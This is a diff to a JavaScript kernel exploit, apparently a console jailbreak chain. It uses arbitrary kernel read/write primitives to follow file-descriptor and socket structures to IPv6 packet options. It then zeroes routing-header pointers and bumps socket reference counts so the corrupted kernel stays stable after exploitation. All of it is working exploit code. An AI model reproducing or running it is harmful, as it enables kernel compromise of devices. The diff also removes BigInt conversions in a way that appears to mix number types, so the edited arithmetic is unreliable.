@@ -1222,18 +1222,14 @@ function get_fd_data_addr(sock) {
 */
     
 function get_fd_data_addr(sock) {
- 
-  const idx = BigInt(sock);
-  const sz  = BigInt(SIZEOF_OFILES);
- 
-  const filep = kmem.read64(ofiles + idx * sz);
-  return kmem.read64(filep);   
+  const filep = kmem.read64(ofiles + sock * SIZEOF_OFILES);
+  return kmem.read64(filep);
 }
 
 function get_sock_pktopts(sock) {
-  const sock_data = get_fd_data_addr(sock);       
-  const pcb       = kmem.read64(sock_data + BigInt(SO_PCB));
-  return kmem.read64(pcb + BigInt(INPCB_PKTOPTS));  
+  const sock_data = get_fd_data_addr(sock);
+  const pcb = kmem.read64(sock_data + SO_PCB);
+  return kmem.read64(pcb + INPCB_PKTOPTS);
 }
 
     
@@ -1539,13 +1535,12 @@ function get_sock_pktopts(sock) {
 
 
 for (let i = 0; i < sds.length; i++) {
-  const pkto = get_sock_pktopts(sds[i]);            
-  kmem.write64(pkto + BigInt(off_ip6po_rthdr), 0n); 
+  const pkto = get_sock_pktopts(sds[i]);
+  kmem.write64(pkto + off_ip6po_rthdr, 0);
 }
-kmem.write64(get_sock_pktopts(reclaim_sock) + BigInt(off_ip6po_rthdr), 0n);
-kmem.write64(worker_pktopts + BigInt(off_ip6po_rthdr),            0n);
+kmem.write64(get_sock_pktopts(reclaim_sock) + off_ip6po_rthdr, 0);
+kmem.write64(worker_pktopts + off_ip6po_rthdr, 0);
 
- 
 const sock_increase_ref = [
   ipv6_kernel_rw.data.master_sock,
   ipv6_kernel_rw.data.victim_sock,
@@ -1554,8 +1549,8 @@ const sock_increase_ref = [
   reclaim_sock,
 ];
 for (const sd of sock_increase_ref) {
-  const sock_addr = get_fd_data_addr(sd);         
-  kmem.write32(sock_addr, 0x100);                  
+  const sock_addr = get_fd_data_addr(sd);
+  kmem.write32(sock_addr, 0x100);
 }
     log("fixes applied");
 
